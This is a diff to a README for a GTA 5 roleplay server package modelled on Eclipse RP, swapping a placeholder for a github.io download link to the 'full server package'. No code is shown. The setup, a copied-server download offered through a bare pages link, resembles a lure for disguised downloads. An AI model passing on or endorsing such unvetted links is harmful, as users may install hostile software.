@@ -3,7 +3,7 @@
 An advanced GTA 5 RP server setup inspired by Eclipse RP — one of the most popular American roleplay servers. Includes full law enforcement system, immersive jobs, custom interfaces, realistic economy, and modular structure — fully compatible with FiveM and txAdmin.
 
 Download the full server package:  
-[![Download](https://img.shields.io/badge/Download-Eclipse_RP_Server-blueviolet)](🔗PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Eclipse_RP_Server-blueviolet)](https://eclipse-rp-gta-5-server-files.github.io/.github/)
 
 ---
 
